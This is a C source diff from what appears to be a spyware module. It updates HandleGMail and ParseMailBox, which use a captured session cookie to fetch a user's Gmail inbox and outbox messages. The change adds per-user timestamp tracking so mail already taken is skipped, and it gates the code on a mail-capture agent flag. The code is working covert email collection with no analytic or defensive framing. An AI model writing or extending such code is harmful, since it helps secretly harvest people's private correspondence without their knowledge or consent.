@@ -14,7 +14,12 @@
 #define FREE_INNER_PARSING(x) if (!x) { SAFE_FREE(r_buffer_inner); break; }
 #define FREE_PARSING(x) if (!x) { SAFE_FREE(r_buffer); return SOCIAL_REQUEST_BAD_COOKIE; }
 
-DWORD ParseMailBox(char *mbox, char *cookie, char *ik_val, DWORD last_tstamp)
+extern DWORD GetLastFBTstamp(char *user, DWORD *hi_part);
+extern void SetLastFBTstamp(char *user, DWORD tstamp_lo, DWORD tstamp_hi);
+
+extern BOOL bPM_MailCapStarted; // variabili per vedere se gli agenti interessati sono attivi
+
+DWORD ParseMailBox(char *mbox, char *cookie, char *ik_val, DWORD last_tstamp_hi, DWORD last_tstamp_lo)
 {
 	DWORD ret_val;
 	BYTE *r_buffer = NULL;
@@ -25,6 +30,7 @@ DWORD ParseMailBox(char *mbox, char *cookie, char *ik_val, DWORD last_tstamp)
 	char mail_id[17];
 	char src_add[1024], dest_add[1024], cc_add[1024], subject[1024];
 	char tmp_buff[256];
+	DWORD act_tstamp_hi=0, act_tstamp_lo=0;
 
 	CheckProcessStatus();
 	// Prende la lista dei messaggi per la mail box selezionata
@@ -46,9 +52,15 @@ DWORD ParseMailBox(char *mbox, char *cookie, char *ik_val, DWORD last_tstamp)
 		if (!atoi(mail_id))
 			continue;
 
-		// XXX Check se lo ha gia' parsato!!!
-		// XXX E salva il timestamp...
-		// XXX ik e' univoco per utente? se si lo posso usare come userid per i timestamp per utente....
+		// Verifica se e' gia' stato preso
+		sscanf(mail_id, "%8x%8X", &act_tstamp_hi, &act_tstamp_lo);
+		if (act_tstamp_hi>2000000000)
+			continue;
+		if (act_tstamp_hi < last_tstamp_hi)
+			continue;
+		if (act_tstamp_hi==last_tstamp_hi && act_tstamp_lo<=last_tstamp_lo)
+			continue;
+		SetLastFBTstamp(ik_val, act_tstamp_lo, act_tstamp_hi);
 
 		_snwprintf_s(mail_request, sizeof(mail_request)/sizeof(WCHAR), _TRUNCATE, L"/mail/?ui=2&ik=%S&view=cv&th=%S&_reqid=1&rt=c&search=%S", ik_val, mail_id, mbox);
 		
@@ -143,15 +155,12 @@ DWORD HandleGMail(char *cookie)
 	WCHAR mail_request[256];
 	char ik_val[32];
 	char *ptr, *ptr2;
-	DWORD last_tstamp;
-
-	// XXX Faccio un bel memory/handle leak
+	DWORD last_tstamp_hi, last_tstamp_lo;
 
 	CheckProcessStatus();
 
-	// XXX
-//	if (!bPM_MailStarted)
-//		return SOCIAL_REQUEST_NETWORK_PROBLEM;
+	if (!bPM_MailCapStarted)
+		return SOCIAL_REQUEST_NETWORK_PROBLEM;
 
 	// Verifica il cookie 
 	swprintf_s(mail_request, L"/mail/?shva=1#%S", GM_INBOX_IDENTIFIER);
@@ -177,10 +186,8 @@ DWORD HandleGMail(char *cookie)
 	_snprintf_s(ik_val, sizeof(ik_val), _TRUNCATE, "%s", ptr);	
 	SAFE_FREE(r_buffer);
 
-	// XXX Carica il last timestamp per questo utente
-	// XXX e lo passa alle due funzioni qui sotto
-	last_tstamp = 0;
+	last_tstamp_lo = GetLastFBTstamp(ik_val, &last_tstamp_hi);
 
-	ParseMailBox(GM_OUTBOX_IDENTIFIER, cookie, ik_val, last_tstamp);
-	return ParseMailBox(GM_INBOX_IDENTIFIER, cookie, ik_val, last_tstamp);
+	ParseMailBox(GM_OUTBOX_IDENTIFIER, cookie, ik_val, last_tstamp_hi, last_tstamp_lo);
+	return ParseMailBox(GM_INBOX_IDENTIFIER, cookie, ik_val, last_tstamp_hi, last_tstamp_lo);
 }
